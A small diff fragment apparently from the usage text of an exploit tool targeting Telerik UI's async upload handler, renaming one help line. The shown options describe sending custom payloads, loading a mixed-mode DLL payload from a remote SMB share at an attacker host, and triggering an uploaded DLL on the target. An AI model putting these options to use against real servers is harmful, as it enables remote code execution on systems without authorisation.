@@ -61,7 +61,7 @@ Send custom payload:                -C partA partB url [proxy]
 
 Check remote SMB payload capability -r lhost url [proxy]
 
-Load remote SMB payload             -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
+Load remote SMB dll payload         -R lhost/share/mixed_mode_assembly.dll url [proxy]\n\n" +
 Trigger local uploaded dll payload  -L c:/users/public/documents/mixed_mode_assembly.dll url [proxy]\n\n" +
 
 Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau
